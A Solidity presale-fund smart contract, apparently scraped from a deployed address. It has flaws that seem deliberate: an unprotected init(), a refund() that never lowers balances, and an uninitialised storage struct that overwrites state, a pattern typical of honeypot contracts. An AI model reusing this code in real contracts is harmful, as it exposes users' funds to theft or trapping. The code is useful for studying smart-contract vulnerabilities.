/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract PresaleFund at 0xf5b72a62d7575f3a03954d4d7de2a2701da16049
*/
pragma solidity ^0.4.16;

contract PresaleFund {
    bool isClosed;
    struct Deposit { address buyer; uint amount; }
    uint refundDate;
    address fiduciary = msg.sender;
    Deposit[] Deposits;
    mapping (address => uint) total;

    function() public payable { }
    
    function init(uint date)
    {
        refundDate = date;
    }

    function deposit()
    public payable {
        if (msg.value >= 0.25 ether && !isClosed)
        {
            Deposit newDeposit;
            newDeposit.buyer = msg.sender;
            newDeposit.amount = msg.value;
            Deposits.push(newDeposit);
            total[msg.sender] += msg.value;
        }
        if (this.balance >= 25 ether)
        {
            isClosed = true;
        }
    }

    function refund(uint amount)
    public {
        if (total[msg.sender] >= amount && amount > 0)
        {
            if (now >= refundDate && isClosed==false)
            {
                msg.sender.transfer(amount);
            }
        }
    }
    
    function close()
    public {
        if (msg.sender == fiduciary)
        {
            msg.sender.transfer(this.balance);
            isClosed = true;
        }
    }
}